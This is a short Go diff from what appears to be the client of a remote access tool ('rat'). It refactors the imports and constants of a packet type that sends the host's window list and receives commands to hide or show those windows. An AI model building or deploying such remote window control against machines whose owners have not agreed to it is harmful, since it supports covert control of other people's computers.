@@ -2,13 +2,13 @@ package main
 
 import (
 	"rat/client/windows"
-	"rat/shared"
-	"rat/shared/network/header"
+
+	"rat/client/network/header"
 )
 
 type WindowsPacket struct {
-	Windows []shared.Window `network:"send,receive"`
-	Action  int             `network:"receive"`
+	Windows []windows.Window `network:"send,receive"`
+	Action  int              `network:"receive"`
 }
 
 func (packet WindowsPacket) Header() header.PacketHeader {
@@ -23,12 +23,12 @@ func (packet *WindowsPacket) Init() {
 
 func (packet WindowsPacket) OnReceive() error {
 	switch packet.Action {
-	case shared.Reload:
+	case windows.Reload:
 		Queue <- &WindowsPacket{}
-	case shared.Minimize:
+	case windows.Minimize:
 		fallthrough
-	case shared.Show:
-		visible := packet.Action == shared.Show
+	case windows.Show:
+		visible := packet.Action == windows.Show
 
 		for _, window := range packet.Windows {
 			windows.SetDisplayState(window.Handle, visible)
